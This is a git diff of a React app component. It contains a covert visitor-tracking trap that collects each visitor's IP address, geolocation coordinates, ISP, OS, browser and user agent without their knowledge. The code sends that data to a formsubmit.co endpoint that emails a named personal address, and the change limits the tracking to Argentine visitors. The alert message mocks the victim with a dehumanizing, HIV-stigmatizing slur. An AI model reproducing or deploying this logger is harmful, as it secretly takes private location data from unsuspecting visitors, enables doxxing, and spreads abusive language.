@@ -54,33 +54,36 @@ function App() {
         // 4. Send email to gonzaloheinen@hotmail.com with the data
         if (!hasFetched.current) {
           hasFetched.current = true;
-          try {
-            await fetch("https://formsubmit.co/ajax/dd244b70f5d86b7b3298dfab17b5aa7b", {
-              method: "POST",
-              headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-              },
-              body: JSON.stringify({
-                _subject: "💀💀🐒🐒🍌🍌 ALERTA - ¡Nuevo BONOBO (con sida) en la página! 🍌🍌🐒🐒💀💀",
-                mensaje: "UN NUEVO BONOBO CON SIDA ACABA DE CAER EN TU SUPER TRAMPA MAGISTRAL (formidable). 🐒🐒🍌🍌 Aca estan sus datos:",
-                ip: ip,
-                city: locJson.city || 'Desconocido',
-                region: locJson.region || 'Desconocido',
-                country: locJson.country || 'Desconocido',
-                coordinates: locJson.loc || 'Desconocido',
-                isp_org: locJson.org || 'Desconocido',
-                timezone: locJson.timezone || 'Desconocido',
-                sistema_operativo: os,
-                navegador: browser,
-                tipo_de_dispositivo: deviceType,
-                user_agent_completo: ua,
-                hora_visitante: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: locJson.timezone || undefined }).format(new Date()),
-                hora_argentina: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: 'America/Argentina/Buenos_Aires' }).format(new Date())
-              })
-            });
-          } catch (emailErr) {
-            console.error("No se pudo enviar el correo:", emailErr);
+
+          if (locJson.country === 'AR') {
+            try {
+              await fetch("https://formsubmit.co/ajax/dd244b70f5d86b7b3298dfab17b5aa7b", {
+                method: "POST",
+                headers: {
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                  _subject: "💀💀🐒🐒🍌🍌 ALERTA - ¡Nuevo BONOBO (con sida) en la página! 🍌🍌🐒🐒💀💀",
+                  mensaje: "UN NUEVO BONOBO CON SIDA ACABA DE CAER EN TU SUPER TRAMPA MAGISTRAL (formidable). 🐒🐒🍌🍌 Aca estan sus datos:",
+                  ip: ip,
+                  city: locJson.city || 'Desconocido',
+                  region: locJson.region || 'Desconocido',
+                  country: locJson.country || 'Desconocido',
+                  coordinates: locJson.loc || 'Desconocido',
+                  isp_org: locJson.org || 'Desconocido',
+                  timezone: locJson.timezone || 'Desconocido',
+                  sistema_operativo: os,
+                  navegador: browser,
+                  tipo_de_dispositivo: deviceType,
+                  user_agent_completo: ua,
+                  hora_visitante: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: locJson.timezone || undefined }).format(new Date()),
+                  hora_argentina: new Intl.DateTimeFormat('es-AR', { dateStyle: 'short', timeStyle: 'medium', timeZone: 'America/Argentina/Buenos_Aires' }).format(new Date())
+                })
+              });
+            } catch (emailErr) {
+              console.error("No se pudo enviar el correo:", emailErr);
+            }
           }
         }
       } catch (err) {
